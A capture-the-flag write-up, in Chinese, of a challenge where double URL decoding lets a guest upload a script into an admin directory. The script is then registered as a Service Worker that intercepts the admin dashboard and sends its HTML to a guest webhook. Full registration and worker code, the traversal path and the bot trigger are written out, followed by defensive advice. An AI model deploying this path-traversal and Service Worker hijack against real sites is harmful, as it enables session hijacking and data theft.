# Scope Drift

## 题目简述

题目提供一个静态文件托管服务。访客可以向 `/u/guest/` 上传 HTML 与 JavaScript，再让管理员 bot 访问指定页面；管理员随后会打开受保护的 `/u/admin/dashboard`。上传接口与静态文件读取逻辑对 URL 路径的解码次数不同：上传校验只解码一次，读取文件时还会再次解码并执行路径规范化。

这组差异允许攻击者把脚本写入原本不可写的 `/u/admin/`。服务端又为该目录返回：

```http
Service-Worker-Allowed: /u/admin/
```

因此，访客页面可以注册作用域为 `/u/admin/` 的恶意 Service Worker，拦截管理员访问 dashboard 时的响应并回传 flag。

## 解题过程

### 1. 利用两次路径解码完成越权写入

上传下面的路径：

```text
/u/guest/%252e%252e/admin/sw.js
```

上传校验只执行一次 URL 解码：

```text
/u/guest/%252e%252e/admin/sw.js
        ↓ decode
/u/guest/%2e%2e/admin/sw.js
```

此时 `%2e%2e` 尚未变成真实的 `..`，字符串仍以 `/u/guest/` 开头，因此能够通过访客目录检查。

静态文件逻辑在落盘或读取时继续解码并规范化路径：

```text
/u/guest/%2e%2e/admin/sw.js
        ↓ decode + normalize
/u/admin/sw.js
```

最终，访客可控的 JavaScript 实际位于 `/u/admin/sw.js`。漏洞的关键不是单纯出现了编码后的 `../`，而是安全校验与文件系统操作没有共享同一份规范化结果。

### 2. 上传 Service Worker 注册页面

在 `/u/guest/index.html` 写入注册逻辑：

```html
<script>
(async () => {
  await navigator.serviceWorker.register(
    "/u/admin/sw.js?cb=" + Date.now(),
    {
      scope: "/u/admin/",
      updateViaCache: "none"
    }
  );

  await navigator.serviceWorker.ready;
  location.href = "/u/admin/dashboard";
})();
</script>
```

查询参数用于避免旧 worker 缓存。由于脚本实际从 `/u/admin/sw.js` 返回，且响应头允许 `/u/admin/` 作用域，浏览器会接受这次注册。

### 3. 拦截 dashboard 并回传响应

通过双重编码路径上传的 `sw.js` 内容如下：

```javascript
self.addEventListener("install", () => {
  self.skipWaiting();
});

self.addEventListener("activate", event => {
  event.waitUntil(self.clients.claim());
});

self.addEventListener("fetch", event => {
  const url = new URL(event.request.url);
  if (url.pathname !== "/u/admin/dashboard") return;

  event.respondWith((async () => {
    const response = await fetch(event.request);
    const body = await response.clone().text();

    await fetch("/webhook/guest", {
      method: "POST",
      keepalive: true,
      headers: {
        "content-type": "application/json"
      },
      body: JSON.stringify({body})
    }).catch(() => {});

    return response;
  })());
});
```

`skipWaiting()` 与 `clients.claim()` 让新 worker 尽快接管页面。`fetch` 处理器只拦截 `/u/admin/dashboard`，读取响应副本后将 HTML 发送到访客 webhook，同时把原响应继续返回给页面。

### 4. 触发管理员 bot

让管理员访问注册页面：

```http
GET /bot?url=http://host/u/guest/index.html
```

bot 打开该页面后注册恶意 worker，随后访问 `/u/admin/dashboard`。这次导航落在 `/u/admin/` 作用域内，响应会被 worker 读取并发送到 `/webhook/guest`。最后访问 `/inbox`，即可从回传的 dashboard HTML 中提取 flag。

## 方法总结

- 核心技巧：利用校验层与文件访问层之间的重复 URL 解码差异，把低权限目录中的上传请求规范化到高权限目录，再通过 Service Worker 接管管理员导航。
- 识别信号：用户可控静态文件、管理员 bot、可上传 JavaScript、路径检查发生在 URL 解码之前，以及 `Service-Worker-Allowed` 允许扩大作用域同时出现时，应检查路径规范化与 Service Worker scope 是否能够组合利用。
- 复用要点：所有鉴权、路径白名单和文件系统操作都应使用同一次规范化后的路径；若多层组件会继续解码，应拒绝解码后仍发生变化的路径。用户内容最好部署在独立 origin，避免与管理页面共享 Service Worker 安全边界。
